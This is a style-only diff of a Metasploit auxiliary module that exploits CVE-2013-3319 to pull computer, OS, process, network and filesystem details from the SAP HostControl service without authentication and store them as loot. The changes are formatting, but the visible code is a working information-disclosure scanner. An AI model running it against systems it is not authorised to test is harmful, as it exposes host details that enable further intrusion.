@@ -10,7 +10,6 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
-
   def initialize
     super(
       'Name' => 'SAP Host Agent Information Disclosure',
@@ -18,34 +17,30 @@ class MetasploitModule < Msf::Auxiliary
         This module attempts to retrieve Computer and OS info from Host Agent
         through the SAP HostControl service.
         },
-      'References' =>
-        [
-          # General
-          ['CVE', '2013-3319'],
-          ['OSVDB', '95616'],
-          ['BID', '61402'],
-          ['URL', 'https://service.sap.com/sap/support/notes/1816536'],
-          ['URL', 'http://labs.integrity.pt/advisories/cve-2013-3319/']
-        ],
-      'Author' =>
-        [
-          'Bruno Morisson <bm[at]integrity.pt>' # Discovery and msf module
-        ],
+      'References' => [
+        # General
+        ['CVE', '2013-3319'],
+        ['OSVDB', '95616'],
+        ['BID', '61402'],
+        ['URL', 'https://service.sap.com/sap/support/notes/1816536'],
+        ['URL', 'http://labs.integrity.pt/advisories/cve-2013-3319/']
+      ],
+      'Author' => [
+        'Bruno Morisson <bm[at]integrity.pt>' # Discovery and msf module
+      ],
       'License' => MSF_LICENSE
     )
 
     register_options(
       [
         Opt::RPORT(1128)
-      ])
+      ]
+    )
 
     register_autofilter_ports([1128])
-
-
   end
 
   def initialize_tables
-
     @computer_table = Msf::Ui::Console::Table.new(
       Msf::Ui::Console::Table::Style::Default,
       'Header' => "Remote Computer Listing",
@@ -57,7 +52,8 @@ class MetasploitModule < Msf::Auxiliary
           "Names",
           "Hostnames",
           "IPAddresses"
-        ])
+        ]
+    )
 
     @os_table = Msf::Ui::Console::Table.new(
       Msf::Ui::Console::Table::Style::Default,
@@ -78,7 +74,8 @@ class MetasploitModule < Msf::Auxiliary
           "CPU User",
           "CPU Sys",
           "CPU Idle"
-        ])
+        ]
+    )
     @net_table = Msf::Ui::Console::Table.new(
       Msf::Ui::Console::Table::Style::Default,
       'Header' => "Network Port Listing",
@@ -93,7 +90,8 @@ class MetasploitModule < Msf::Auxiliary
           "ErrorsIn",
           "ErrorsOut",
           "Collisions"
-        ])
+        ]
+    )
 
     @process_table = Msf::Ui::Console::Table.new(
       Msf::Ui::Console::Table::Style::Default,
@@ -112,7 +110,8 @@ class MetasploitModule < Msf::Auxiliary
           "CPU",
           "CPU Time",
           "Command"
-        ])
+        ]
+    )
 
     @fs_table = Msf::Ui::Console::Table.new(
       Msf::Ui::Console::Table::Style::Default,
@@ -126,7 +125,8 @@ class MetasploitModule < Msf::Auxiliary
           "Size",
           "Available",
           "Remote"
-        ])
+        ]
+    )
 
     @net_table = Msf::Ui::Console::Table.new(
       Msf::Ui::Console::Table::Style::Default,
@@ -142,8 +142,8 @@ class MetasploitModule < Msf::Auxiliary
           "ErrorsIn",
           "ErrorsOut",
           "Collisions"
-        ])
-
+        ]
+    )
   end
 
   # Parses an array of mProperties elements. For every mProperties element,
@@ -241,9 +241,9 @@ class MetasploitModule < Msf::Auxiliary
       os_info[12],     # Load Average (5m)
       os_info[13],     # Load Average (15m)
       os_info[17],     # Number of CPUs / Cores
-      os_info[18]+'%', # CPU usage (User)
-      os_info[19]+'%', # CPU usage (system)
-      os_info[20]+'%'  # CPU idle
+      os_info[18] + '%', # CPU usage (User)
+      os_info[19] + '%', # CPU usage (system)
+      os_info[20] + '%'  # CPU idle
     ]
   end
 
@@ -255,7 +255,7 @@ class MetasploitModule < Msf::Auxiliary
       process_info[3],     # Priority
       process_info[4],     # Mem size
       process_info[5],     # pages
-      process_info[6]+'%', # CPU usage
+      process_info[6] + '%', # CPU usage
       process_info[7],     # CPU time
       process_info[8]      # Command
     ]
@@ -281,9 +281,7 @@ class MetasploitModule < Msf::Auxiliary
     ]
   end
 
-
   def run_host(rhost)
-
     vprint_status("#{rhost}:#{rport} - Connecting to SAP Host Control service")
 
     data = '<?xml version="1.0" encoding="utf-8"?>'
@@ -296,7 +294,6 @@ class MetasploitModule < Msf::Auxiliary
     data << "</SOAP-ENV:Body></SOAP-ENV:Envelope>\r\n\r\n"
 
     begin
-
       res = send_request_raw(
         {
           'uri' => "/",
@@ -305,8 +302,8 @@ class MetasploitModule < Msf::Auxiliary
           'headers' => {
             'Content-Type' => 'text/xml; charset=UTF-8',
           }
-        })
-
+        }
+      )
     rescue ::Rex::ConnectionError
       vprint_error("#{rhost}:#{rport} - Unable to connect to service")
       return
@@ -352,7 +349,7 @@ class MetasploitModule < Msf::Auxiliary
       sap_tables_clean << t.to_s
     end
 
-    vprint_good("#{rhost}:#{rport} - Information retrieved:\n"+sap_tables_clean)
+    vprint_good("#{rhost}:#{rport} - Information retrieved:\n" + sap_tables_clean)
 
     xml_raw = store_loot(
       "sap.getcomputersystem",
@@ -373,6 +370,5 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     print_status("#{rhost}:#{rport} - Response stored in #{xml_raw} (XML) and #{xml_parsed} (TXT)")
-
   end
 end
